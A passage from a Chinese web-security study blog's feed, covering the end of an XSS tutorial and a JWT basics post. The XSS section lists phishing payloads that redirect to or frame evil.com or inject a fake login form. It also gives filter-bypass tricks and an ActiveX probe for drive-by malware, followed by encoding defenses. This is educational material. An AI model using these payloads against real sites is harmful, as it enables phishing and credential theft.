title="重定向钓鱼"></a>重定向钓鱼</h5><p>把当前页面重定向到一个钓鱼页面（可以是自己搭建的页面，来获取用户的信息）</p><p><code>http://www.bug.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</code></p><p>例：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/22.png" alt="22"></p><h5 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h5><p>使用XSS漏洞注入HTML或JavaScript代码到页面中</p><p><code>http://www.bug.com/index.php?search=&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code> 该段代码会在正常页面中嵌入一个Form表单（登录框）</p><p>例：<br><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/23.png"></p><h5 id="iframe钓鱼"><a href="#iframe钓鱼" class="headerlink" title="iframe钓鱼"></a>iframe钓鱼</h5><p>通过<iframe>标签嵌入远程域的一个页面实施钓鱼</iframe></p><p><code>http://www.bug.com/index.php?search=&#39;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/24.png" alt="24"></p><h4 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h4><p>在IE中，可以通过判断ActiveX控件的classid是否存在，来推断用户是否安装了该软件。这种方法很早被用于“挂马攻击”—黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。</p><p>如下代码：</p><blockquote><p>try {</p><p>var Obj&#x3D; new ActiveXObject(‘xxxxxx’)       &#x2F;&#x2F;xxxxxx为某控件</p><p>}catch(e){</p><p>&#x2F;&#x2F;异常了，不存在该控件</p><p>}</p></blockquote><p><a href="https://blog.csdn.net/Monsterlz123/article/details/91127385">通过XSS进行网页挂马复现</a></p><h4 id="XSS-Worm"><a href="#XSS-Worm" class="headerlink" title="XSS Worm"></a>XSS Worm</h4><p>2005年，19岁的Samy Kamkar发起对Myspace.com的XSS的XSS Worm攻击（Web安全史上第一个重量级的XSS Worm）</p><p>XSS Worm是XSS的一种终极利用方式，它的破坏性和影响力巨大，但也有一定的条件。一般来说，用户之间发生交互行为的页面，如果存在存储型XSS（注意发送站内信、用户留言等页面），则比较容易发生XSS Worm攻击。</p><p><a href="https://blog.csdn.net/qq_33605106/article/details/79756478">百度XSS Worm</a></p><h2 id="XSS攻击技巧"><a href="#XSS攻击技巧" class="headerlink" title="XSS攻击技巧"></a>XSS攻击技巧</h2><ul><li><p>利用字符编码</p><p>利用字符编码，通过这种技巧，不仅能让 XSS 代码绕过服务端的过滤，还能更好地隐藏 Shellcode；（ JS 支持 unicode、eacapes、十六进制、十进制等编码形式）</p></li><li><p>绕过 XSS-Filter，利用 &lt;&gt; 标签注入 Html&#x2F;JavaScript 代码；</p></li><li><p>利用 HTML 标签的属性值进行 XSS 攻击。例如：<img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/javascript:alert(‘xss’)">；（当然并不是所有的 Web 浏览器都支持 Javascript 伪协议，所以此类 XSS 攻击具有一定的局限性）</p></li><li><p>空格、回车和 Tab。如果 XSS Filter 仅仅将敏感的输入字符列入黑名单，比如 javascript，用户可以利用空格、回车和 Tab 键来绕过过滤，例如：&lt;img src&#x3D;“javas cript:alert(&#x2F;xss&#x2F;);”&#x2F;&gt;；</p></li><li><p>利用事件来执行跨站脚本。例如：&lt;img src&#x3D;”#” onerror&#x3D; “alert(1)”&#x2F;&gt;，当 src 错误的视乎就会执行 onerror 事件；</p></li><li><p>利用 CSS 跨站。例如：body {backgrund-image: url(“javascript:alert(‘xss’)”)}；扰乱过滤规则。例如：&lt;IMG SRC&#x3D;“javaSCript: alert(&#x2F;xss&#x2F;);”&#x2F;&gt;；</p></li><li><p>拆分跨站法，将 XSS 攻击的代码拆分开来，适用于应用程序没有过滤 XSS 关键字符（如&lt;、&gt;）却对输入字符长度有限制的情况下；</p></li><li><p>DOM 型的 XSS 主要是由客户端的脚本通过 DOM 动态地输出数据到页面上，它不依赖于提交数据到服务器，而是从客户端获得DOM中的数据在本地执行。容易导致 DOM 型的 XSS 的输入源包括：Document.URL、Location(.pathname|.href|.search|.hash)、Document.referrer、Window.name、Document.cookie、localStorage&#x2F;globalStorage；</p></li></ul><h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如＜、＞、‘　、“等，如果发现存在特殊字符，则将这些字符过滤或者编码。比较智能的输入检查，可能还会匹配XSS的特征。比如”<script>“，”javascript"等敏感字符。这种输入检查的方式，可以称为“XSS Filter”</p><p>但XSS Filter进行XSS检查时，用户数据没有结合渲染页面的HTML代码，因此XSS Filter 对语境的理解并不完整；且对“<”、“>”等字符的处理，可能会改变用户数据的语义。</p><h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>一般来说，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击</p><p>编码分为很多种，有针对html，javascript等的编码方式</p><p>**1.**针对HTML的编码方式：HTMLEncode</p><p>为了对抗XSS，要求至少转换以下字符：</p><table><thead><tr><th>字符</th><th>编码后</th></tr></thead><tbody><tr><td>&amp;</td><td>&amp;amp</td></tr><tr><td>&lt;</td><td>&amp;lt</td></tr><tr><td>&gt;</td><td>&amp;gt</td></tr><tr><td>“</td><td>&amp;quot</td></tr><tr><td>‘</td><td>&amp;#x27</td></tr><tr><td>&#x2F;</td><td>&amp;#x2F</td></tr></tbody></table><p>**2.**在php中，有phplentities()和htmlspecialchars()两个函数可以满足安全要求</p><p>**3.**针对jJS的编码方式：JavascriptEncode</p><p>与HTMLEncode不同，他需要使用“/“对特殊字符进行转义</p><p>在对抗XSS时，还要求输出的变量必须在引号内部。比较以下两种写法：</p><blockquote><p>var x = escapeJavascript ( $ evil ) ;</p><p>var y =' " ' +escapeJavascript ( $ evil ) + ' " ' ;</p></blockquote><p>如果escapeJavascript()函数只转义几个危险字符，比如 ’、“、< 、> 、\ 、& 、# 等，那么上面的两行代码输出后可能会变成：</p><blockquote><p>var x = 1 ; alert (2) ;</p><p>var y = " 1 ; alert (2) " ;</p></blockquote><p>第一行执行额外的代码了；第二行则是安全的。</p><p>对于第二行，攻击者即使想逃逸出引号的范围：<code> var y =&quot;\&quot;; alert(1)\/\/ &quot;</code></p><p>所以JavascriptEncode的变量输出一定要在引号内。防止开发者忘了，只能使用一个更严格的JavascriptEncode函数来保证安全——除了数字、字母外的所有字符，都使用十六进制“\xHH” 的方式进行编码</p></script></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;XSS攻击&quot;&gt;&lt;a href=&quot;#XSS攻击&quot; class=&quot;headerlink&quot; title=&quot;XSS攻击&quot;&gt;&lt;/a&gt;XSS攻击&lt;/h1&gt;&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。&lt;/p&gt;
&lt;p&gt;XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网页中，并由浏览器解释运行这段JS脚本注入的网页，以达到恶意攻击的效果。用户用最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然而浏览器不会判断代码是否恶意，即XSS的对象是用户和浏览器。&lt;/p&gt;
&lt;p&gt;XSS危害：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.窃取用户Cookie，如果用户Cookie被窃取，攻击者可以不通过密码，而直接登录用户账户&lt;br&gt;2.使用XMLHttpRequest构造模拟用户请求操作&lt;br&gt;3.XSS钓鱼攻击&lt;br&gt;4.用户PC信息探测收集器&lt;br&gt;5.XSS蠕虫攻击&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="web学习" scheme="https://krismile-ni.github.com/categories/web%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web基础" scheme="https://krismile-ni.github.com/tags/web%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>JWT基础知识</title>
    <link href="https://krismile-ni.github.com/2022/04/08/JWT%E5%9F%BA%E7%A1%80/"/>
    <id>https://krismile-ni.github.com/2022/04/08/JWT%E5%9F%BA%E7%A1%80/</id>
    <published>2022-04-08T12:28:34.000Z</published>
    <updated>2022-04-09T07:32:27.651Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JWT基础知识"><a href="#JWT基础知识" class="headerlink" title="JWT基础知识"></a>JWT基础知识</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>系统梳理总结cookie、Session和Token</p><ul><li>cookie：存在客户端，保存信息</li><li>Session：存在服务端，解决多用户问题，每个客户端对应一个session</li><li>Token：无状态且支持跨域，防御CSRF，解决session依赖于单个web服务器</li></ul><span id="more"></span><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>cookie：网站向访问电脑写入的小文本，记录用户ID、密码、停留时间等，大多数是4KB。cookie分成两类：1.内存Cookie，保存在内存，浏览器关闭就消失；2.硬盘Cookie，保存在硬盘里，有过期时间。</p><p>HTTP协议是一种无状态协议（服务器不会记录客户端的历史请求），cookie和session的主要目的就是为了弥补HTTP的无状态特性</p><p><img src="https://krismile-ni.github.io/2022/04/08/image/1.png"></p><p>​    1、当用户第一次访问服务器时，服务器可以响应信息（response）中增加Set-Cookie响应头，将信息以cookie为载体发送到浏览器</p><p>​    2、浏览器接收到服务器放来的Cookie信息，将它保存到浏览器的缓冲区</p><p>​    3、当浏览器再次访问服务器时，将Cookie放在请求消息中，Web服务器就可以通过request中的用户信息来分辨请求的用户</p><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>session：客户端请求服务端，服务端会为这次请求开辟一块内存空间，这个对象便是session对象，存储结构为concurrentHashMap。session弥补了HTTP无状态特性，服务器可以利用Session存储客户端在同一个会话期间的一些操作记录，服务器也为session设置了一个有效期（30分钟）</p><p><img src="https://krismile-ni.github.io/2022/04/08/image/2.png"></p><p>session原理：</p><ol><li>服务器第一次接收到请求时，开辟了一块session空间（创建session对象），同时生成一个sessionid，并通过响应头的<code>set-cookie:JSESSIONID=xxxxxx</code>命令，向客户端发送要求设置cookie的响应</li><li>客户端收到响应后，在本机设置应该<code>JSESSION=xxxxxx</code>的cookie信息，该cookie的过期时间为浏览器会话结束</li><li>接下来客户端每次向同一个网站发送请求时，请求头都会带上该cookie信息（包含sessionid）然后服务器通过读取请求头中的cookie信息，获取名称JSESSION的值，得到sessionid</li></ol><h4 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h4><p>Token：令牌，本质上它是一个全局唯一的字符串，用来唯一识别一个客户端，它不是一种web规范，可以理解它是借鉴了cookie和session工作原理，进而延申出来的一种维持用户会话状态的机制</p><p>Token原理：</p><ol><li>客户端使用用户名跟密码请求登录</li><li>服务端收到请求，验证用户名和密码</li><li>验证成功后，服务端会签发一个Token，将其发送给客户端</li><li>客户端收到Token后，将其存储起来，放在cookie或者local storage里</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的Token</li><li>服务端收到请求，去验证客户端请求里面带着的Token是否成功，成功就向客户端返回请求的数据</li><li>因为token是被签名的，所以可以认为一个可以解码认证通过的token是由系统发放的，其中带的信息是合法有效的</li></ol><p>Token特点：</p><ul><li>支持跨域访问，前提是传输的用户认证信息通过HTTP头传输</li><li>无状态，在服务端不需要存储session信息，因为Token自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息</li><li>更适合CDN（构建在数据网络上的一种分布式的内容分发网），服务端只要提供API即可</li><li>去耦，不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要API被调用就会调用Token生成</li><li>更适合移动应用</li><li>CSRF，因为不再依赖于cookie，不需要考虑对CSRF（跨站请求伪造）的防范</li></ul><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><p>  Json Web Token(JWT)，是为了再网络应用环境间传递申明而执行的一种基于JSON的开放标准。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO)场景，是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;姓名&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;角色&quot;</span><span class="punctuation">:</span> <span class="string">&quot;管理员&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;到期时间&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</p><p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p><h3 id="数据结构："><a href="#数据结构：" class="headerlink" title="数据结构："></a>数据结构：</h3><p>JWT结构：</p><p><img src="https://krismile-ni.github.io/2022/04/08/image/3.png" alt="img"></p><p>它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的</p><p>JWT 的三个部分依次如下:</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p>写成一行，就是下面的样子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure><p>每个部分最后都会使用base64编码</p><h5 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h5><p>Header部分是一个JSON对象，描述JWT的元数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>alg属性表示token签名的算法(algorithm)，最常用的为HMAC和RSA算法</p><p>typ属性表示这个token的类型（type），JWT 令牌统一写为JWT。</p><h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><p>payload部分也是一个JSON对象，用来实际需要传递的数据。JWT规定了7个官方字段</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，还可以在这个部分定义私有字段。</p><p>注意：JWT 默认是不会对 Payload 加密的，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分</p><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>Signature 部分是对前两部分的签名，防止数据篡改</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，<strong>使用 Header 里面指定的签名算法（默认是 HMAC SHA256）</strong>，按照下面的公式产生签名。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;JWT基础知识&quot;&gt;&lt;a href=&quot;#JWT基础知识&quot; class=&quot;headerlink&quot; title=&quot;JWT基础知识&quot;&gt;&lt;/a&gt;JWT基础知识&lt;/h2&gt;&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;系统梳理总结cookie、Session和Token&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cookie：存在客户端，保存信息&lt;/li&gt;
&lt;li&gt;Session：存在服务端，解决多用户问题，每个客户端对应一个session&lt;/li&gt;
&lt;li&gt;Token：无状态且支持跨域，防御CSRF，解决session依赖于单个web服务器&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="web学习" scheme="https://krismile-ni.github.com/categories/web%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web基础" scheme="https://krismile-ni.github.com/tags/web%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
</feed>
